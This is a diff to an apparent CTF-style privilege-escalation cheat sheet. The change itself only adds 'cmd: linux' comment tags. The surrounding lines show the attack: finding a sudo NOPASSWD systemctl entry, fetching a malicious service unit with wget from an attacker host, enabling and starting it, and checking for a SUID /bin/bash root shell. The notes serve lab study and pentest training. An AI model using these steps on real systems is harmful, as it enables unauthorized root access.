@@ -20,6 +20,7 @@ One of:
 
 ### 1. Recon — what can I do with systemctl
 
+<!-- cmd: linux -->
 ```bash
 sudo -l
 # (root) NOPASSWD: /bin/systemctl
@@ -55,6 +56,7 @@ Variants for `ExecStart=`:
 
 ### 3. Stage the unit on the target
 
+<!-- cmd: linux -->
 ```bash
 # Attacker
 python3 -m http.server 3333
@@ -66,6 +68,7 @@ wget http://$LHOST:3333/root.service
 
 ### 4. Enable + start
 
+<!-- cmd: linux -->
 ```bash
 systemctl enable /tmp/root.service        # absolute path required
 systemctl start root                      # service name = filename without .service
@@ -74,6 +77,7 @@ systemctl start root                      # service name = filename without .ser
 
 ### 5. Cash in
 
+<!-- cmd: linux -->
 ```bash
 ls -l /bin/bash
 # -rwsr-xr-x 1 root root ... /bin/bash     SUID set
@@ -95,6 +99,7 @@ ls -l /bin/bash
 
 ## How to Find It
 
+<!-- cmd: linux -->
 ```bash
 sudo -l 2>/dev/null | grep -i systemctl                 # [USED — vulnversity]
 ls -la /etc/systemd/system/ /run/systemd/system/ 2>/dev/null   # writable unit dirs
